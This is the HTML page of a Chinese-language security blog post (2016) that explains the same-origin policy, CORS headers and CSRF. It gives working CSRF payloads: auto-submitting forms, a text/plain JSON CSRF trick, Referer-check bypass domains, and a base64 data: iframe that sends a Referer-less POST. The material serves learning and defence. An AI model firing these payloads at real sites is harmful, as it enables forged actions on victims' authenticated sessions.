@@ -1,0 +1,501 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>CSRF | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="同源策略同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。只要协议、端口、主机三个有一个不匹配，就是跨域请求。
+如果要跨域请求，有下面的限制：
+
+仅允许GET、HEAD、POST请求
+仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头
+Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。
+
+满足以上三个请求的，称为simple request当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以Access-Control-开头，比较重要的有：
+
+Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。
+
+
+在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。
+
+
+Access-Control-Allow-Credentials: 允许这个请求使用cookie。
+
+
+一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。
+
+XMLHttpRequest:
+
+var xhr &amp;#x3D; new XMLHttpRequest();
+xhr.open(&amp;#39;GET&amp;#39;, url, true);
+xhr.withCredentials &amp;#x3D; true;
+xhr.onreadystatechange &amp;#x3D; handler;
+xhr.send()"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="CSRF"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> CSRF</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p>
+<p>如果要跨域请求，有下面的限制：</p>
+<ul>
+<li>仅允许GET、HEAD、POST请求</li>
+<li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li>
+<li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li>
+</ul>
+<p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p>
+<ul>
+<li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li>
+</ul>
+<blockquote>
+<p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p>
+</blockquote>
+<ul>
+<li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li>
+</ul>
+<blockquote>
+<p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:
+
+var xhr &#x3D; new XMLHttpRequest();
+xhr.open(&#39;GET&#39;, url, true);
+xhr.withCredentials &#x3D; true;
+xhr.onreadystatechange &#x3D; handler;
+xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">JQuery:
+
+$.ajax(&#123;
+	&#39;url&#39;: url,
+	&#39;type&#39;: &#39;GET&#39;,
+	&#39;xhrFields&#39;: &#123;&#39;withCredentials&#39;: true&#125;,
+	&#39;success&#39;: handler
+	&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>Access-Control-Request-Method 和 Access-Control-Allow-Methods声明所允许的HTTP methods，普通的跨域请求只支持GET、HEAD和POST方法，想用其他方法的话需要将<code>Access-Control-Request-Method</code>设置为DELETE等其他方法，则返回的<code>Access-Control-Allow-Methods</code>中返回所有支持的方法</li>
+</ul>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>两种类型：GET POST</p>
+<p>GET:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;img src&#x3D;http:&#x2F;&#x2F;wooyun.org&#x2F;delete&#x2F;id &#x2F;&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>POST:利用自动提交表单</p>
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;form action&#x3D;http:&#x2F;&#x2F;wooyun.org&#x2F;add  method&#x3D;POST&gt;
+
+&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xx&quot; value&#x3D;&quot;11&quot;&gt;
+
+&lt;&#x2F;form&gt;
+
+&lt;script&gt; document.forms[0].submit();&lt;&#x2F;script&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>常见防御有两种：检查Referer和使用token，如果同域下存在xss，除了验证码，其他都无法防御这个问题。</p>
+<p>程序后端可能使用REQUEST方式接受，但是程序默认使用POST，所以改为GET请求也可以。</p>
+<p>当采用Refer防御的时候，可以把请求中的这个字段修改如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">
+原始Refer： http:&#x2F;&#x2F;test.com&#x2F;index.php
+
+绕过之后：
+
+http:&#x2F;&#x2F;test.com.attack.com&#x2F;index.php
+
+http:&#x2F;&#x2F;attack.com&#x2F;test.com&#x2F;index.php
+
+[空]
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>CSRF攻击会根据不同场景，大到垂直越权，这些场景的攻击都是<strong>跨域请求</strong>，并且比较重要的都是在受害者身份得到认证的以后发生的。</p>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>GET型的<code>CSRF</code>（带src属性的HTML标签都可以跨域发起GET请求）:</p>
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;link href&#x3D;&quot;…&quot;&gt;
+
+&lt;img src&#x3D;&quot;…&quot;&gt;
+
+&lt;iframe src&#x3D;&quot;…&quot;&gt;
+
+&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0; url&#x3D;…&quot;&gt;
+
+&lt;script src&#x3D;&quot;…&quot;&gt;
+
+&lt;video src&#x3D;&quot;…&quot;&gt;
+
+&lt;audio src&#x3D;&quot;…&quot;&gt;
+
+&lt;a href&#x3D;&quot;…&quot;&gt;
+
+&lt;table background&#x3D;&quot;…&quot;&gt;
+
+…
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>POST请求，则必须使用表单提交的方式，这些标签可以使用JavaScript动态生成：</p>
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;script&gt;
+
+    new Image().src&#x3D;&#39;http:&#x2F;&#x2F;wooyun.org&#x2F;csrf&#39;;
+
+&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>###POST类型的CSRF</p>
+<ul>
+<li>foms’ method is limited to GET and POST</li>
+<li>form’s POST message is limited to the three formats <ul>
+<li>application/x-www-form-urlencode</li>
+<li>multipart/form-data</li>
+<li>text/plain</li>
+</ul>
+</li>
+<li>with the form data encodeing text/plain it is still possible to forge requests containg valid json data.</li>
+</ul>
+<blockquote>
+<p>The POST body of an HTML form’s request is always either <code>application/x-www-form-urlencoded</code>,<code>multipart/form-data</code>, or <code>text-plain</code>。</p>
+</blockquote>
+<p>现在考虑下有一个对于post请求，其中body是json格式，服务端校验<code>Content-Type: application/json</code>字段</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;member&#x2F;shop&#x2F;query HTTP&#x2F;1.1
+Host: example.com
+Content-Length: 147
+Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;52.0.2743.116 Safari&#x2F;537.36
+Content-Type: application&#x2F;json; charset&#x3D;UTF-8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.8
+Connection: close
+
+&#123;&quot;bussid&quot;: 110&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对于上面这个请求来说，假设他存在csrf，那么html怎么写？</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;example.com&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;text&#x2F;plain&quot;&gt;
+	&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&#39;&#123;&quot;bussid&quot;: 1&#125;&#39; &#x2F;&gt;
+&lt;&#x2F;form&gt;
+&lt;script&gt;
+	document.forms[0].submit();
+&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>抓包之后可以发现，<code>POST</code>的body数据包是这样的：<code>&#123;&quot;bussid&quot;: 1&#125;=</code>，没看错，后面多了一个等号。为毛会这样子，因为是这样的：</p>
+<blockquote>
+<p>it’s simply the stand delimiter placed in POST request between parameters, which would usually look like this:<br><code>test=x&amp;more=bar</code></p>
+</blockquote>
+<p>肿么绕过去：</p>
+<blockquote>
+<p>an intersting way of getting around this is that <em>some</em> JSON parser accept C stype comments, so you could expand your payload to end in a double slash, effectively commenting out tie equals sign and creating this:<br><code>&#123;&quot;bussid&quot;: 1&#125;//=</code></p>
+</blockquote>
+<p>BUT：</p>
+<blockquote>
+<p>“JSON does not have comments, A JSON encoder MUST NOT output comments, A JSON decodert MAY accept and ignore comments.”</p>
+</blockquote>
+<p>解决方法是这样的，跟sql注入或者xss差不多，要把后面的<code>=</code>号补全，最后就是希望这个填充不会影响到请求。如下</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;example.com&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;text&#x2F;plain&quot;&gt;
+       	&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&#39;&#123;&quot;bussid&quot;: 1,&quot;ignore_me&quot;:&quot;&#39;value&#x3D;&#39;test&quot;&#125;&#39; &#x2F;&gt;
+&lt;&#x2F;form&gt;
+&lt;script&gt;
+       	document.forms[0].submit();
+&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>多出来的那一段是为了闭合上面的那个<code>=</code>，对于这个请求，其中的body是这个：<br><code>&#123;&quot;bussid&quot;: 1,&quot;ignore_me&quot;:&quot;=test&quot;&#125;</code></p>
+<p>只能希望服务器会丢弃掉多余的JSON，并且这种请求是<code>text/plain</code>格式。</p>
+<p>那么最后的问题来了：</p>
+<pre><code>All that we need to perform a JSON CSRF attack is to 
+submit a valid JSON request using html or a client side 
+code. So, Why cannot we use XMLHTTPRequest object to 
+create a valid JSON request?
+</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;ajax.cdnjs.com&#x2F;ajax&#x2F;libs&#x2F;json2&#x2F;20110223&#x2F;json2.js&quot;&gt;&lt;&#x2F;script&gt;
+if (window.XMLHTTPReuquest)&#123;
+var xmlhttp&#x3D;new XMLHttpRequest();
+&#125;
+else&#123;
+var xmlhttp&#x3D;new ActiveXObject(&#39;Microsoft.XMLHTTP&quot;);
+&#125;
+xmlhttp.open(&quot;POST&quot;, &quot;http:&#x2F;&#x2F;sample.com&quot;, true);
+xmlhttp.withCredentials&#x3D;&quot;true&quot;;
+xmlhttp.setRequestHeader(&quot;Content-Type&quot;, &quot;application&#x2F;json;charset&#x3D;UTF-8&quot;);
+xmlhttp.send(JSON.stringify(&#123;&quot;buddis&quot;: 1&#125;));
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个上面的代码是不会成功的，因为当跨域访问的时候，浏览器会先向这个地址发起一个OPTION请求，询问是否可用，然后再发起实际的请求。会用到以下的header：</p>
+<ul>
+<li><p>Access-Control-Request-Method 和 Access-Control-Allow-Methods：声明所允许及使用的HTTP methods，普通跨域请求只支持GET、HEAD、POST方法，想用其他方法的话，访问需要将<code>Access-Control-Request-Method</code>设置为DELETE等其他方法，然后被请求的网站在Access-Control-Allow-Methods中返回所有支持的方法（用逗号隔开）即可。</p>
+</li>
+<li><p>Access-Control-Request-Headers 和 Access-Control-Allow-Headers：声明所用及允许的的HTTP headers，类似上一组，用于支持其他请求头。</p>
+</li>
+<li><p>Access-Control-Max-Age: 告诉浏览器多长时间内不要发送相同的Preflighted request，直接使用缓存的结果。</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.keakon.net/2015/12/06/%E4%B8%8E%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84HTTP%E5%A4%B4">https://www.keakon.net/2015/12/06/%E4%B8%8E%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84HTTP%E5%A4%B4</a></p>
+<p><a target="_blank" rel="noopener" href="https://itsecurityconcepts.com/2014/04/22/csrf-on-json-requests/">https://itsecurityconcepts.com/2014/04/22/csrf-on-json-requests/</a></p>
+<h2 id="饶过"><a href="#饶过" class="headerlink" title="饶过"></a>饶过</h2><p>如果防御CSRF的策略是这样的：</p>
+<p>验证Origin或者Referer，如果Referer是空，请求放行。这种防御有个缺陷：</p>
+<p>使用iframe的data协议或者https发起的请求是没有Referer的。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+    &lt;body&gt;
+       &lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg&#x3D;&#x3D;&quot;&gt;
+    &lt;&#x2F;body&gt; 
+&lt;&#x2F;html&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li><a target="_blank" rel="noopener" href="http://0x007.blog.51cto.com/6330498/1610946">http://0x007.blog.51cto.com/6330498/1610946</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2016/08/29/csrf.html" class="leancloud-visitors view" data-flag-title="CSRF">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2016/09/25/whitehat-talk-web-security.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2016/07/26/python-cpickle-shell.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2016-08-29 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-article-text">同源策略</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CSRF"><span class="toc-article-text">CSRF</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-article-text">攻击方式</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%A5%B6%E8%BF%87"><span class="toc-article-text">饶过</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
